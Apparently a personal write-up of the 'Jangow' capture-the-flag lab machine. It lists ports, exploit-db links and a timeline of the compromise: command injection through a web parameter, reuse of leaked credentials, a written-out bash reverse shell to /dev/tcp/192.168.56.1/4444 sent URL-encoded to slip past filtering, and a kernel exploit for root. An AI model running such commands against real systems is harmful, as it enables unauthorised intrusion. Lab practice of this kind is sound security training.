# IP Address
192.168.56.118

# Ports Discovery
21 ftp
80 http

# Dir of interest
/site

# Useful exploit 
https://www.exploit-db.com/exploits/46676
https://www.exploit-db.com/exploits/45010

# Timeline
 - The Buscar link is vulnerable to local file injection (LFI). "buscar=" parameter prints out results for bash commands like pwd
 - Found a Wordpress Folder that can have some crucial data.
 - Found a config.php that contains username and password
 - username: desafio02 password: abygurl69 (doesn't work for ftp)
 - pwd prints /var/www/html/site
 - moving up a directory reveals .backup file which contains username and password
 - username: jangow01 password: abygurl69 (worked for ftp)
 - Found user flag in jangow01 directory
 - trying to upload php pentestmonkry reverse shell but ftp not allowing file upload
 - /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1' ... passing this as busque parameter
 - its sanitised so sending it by urlencoding it\
 - reverse shell worked, using linpeas.sh for privesc
 - linpeas detected a kernel exploit CVE-2017-16995 that I can use for  privEsc
 - Downloading the exploit and sending it to the target using ftp
 - using gcc to execute the exploit, gives me the root shell
 - got the final flag, proof.txt at /root directory 

# Flags

User: d41d8cd98f00b204e9800998ecf8427e

root:
                        @@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@&&&&&&&&&&&&&&                          
                       @  @@@@@@@@@@@@@@@&#   #@@@@@@@@&(.    /&@@@@@@@@@@                          
                       @  @@@@@@@@@@&( .@@@@@@@@&%####((//#&@@@&   .&@@@@@                          
                       @  @@@@@@@&  @@@@@@&@@@@@&%######%&@*   ./@@*   &@@                          
                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&.   &@@@&&                    
                       @  @@@, /@@@@@@@@#,                       .@.  ,&,   @@&&                    
                       @  @&  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&                    
                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                   
                       @@&  @@@@@@@@*          @@@@@@@@@@@             ,        @                   
                       @&  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &@                  
                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 
                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 
                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 
                       @&   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  
                       @@    ,@@@@@@@@,   @@@@@@@@@&*%@@@@@@@@@,    @@@@@(%&*   &@                  
                       @@&     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &@                   
                       @ @&     ,@@@@@@@@@@@@@@@,@@@@@@@&%@@@@@@@@@@@@@@@%*   &@                    
                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &@&                    
                       @  @@@&       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &@@&&                    
                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&#/.      &@@@@&&                    
                       @  @@@@@@@@&               JANGOW               &@@@                          
                       @  &&&&&&&&&@@@&     @@(&@ @. %.@ @@%@     &@@@&&&&                          
                                     &&&@@@@&%       &/    (&&@@@&&&                                
                                       (((((((((((((((((((((((((((((





da39a3ee5e6b4b0d3255bfef95601890afd80709

